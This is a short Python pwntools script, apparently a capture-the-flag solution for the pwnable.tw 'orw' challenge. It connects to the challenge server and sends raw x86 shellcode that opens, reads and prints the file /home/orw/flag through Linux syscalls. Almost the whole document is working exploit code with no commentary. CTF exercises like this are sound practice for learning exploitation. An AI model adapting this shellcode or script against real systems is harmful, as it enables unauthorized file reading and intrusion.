from pwn import *

debug = 0
def exploit():

	shellcode="\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x53\x68\x66\x6C\x61\x67\x68\x6F\x72\x77\x2F\x68\x6F\x6D\x65\x2F\x68\x2F\x2F\x2F\x68\x89\xE3\x6A\x05\x58\x6A\x00\x59\xCD\x80\x89\xC3\x6A\x03\x58\x83\xEC\x32\x54\x59\x6A\x28\x5A\xCD\x80\x6A\x04\x58\x6A\x01\x5B\xCD\x80"
	s.recvuntil(':')
	s.sendline(shellcode)
	print s.recv()

if __name__ == '__main__':
	if debug:
		s = process('./orw')
		#gdb.attach(s)
		#s.pause()

	else:
		s = remote('chall.pwnable.tw', 10001)

	exploit()
	s.interactive()
	s.close()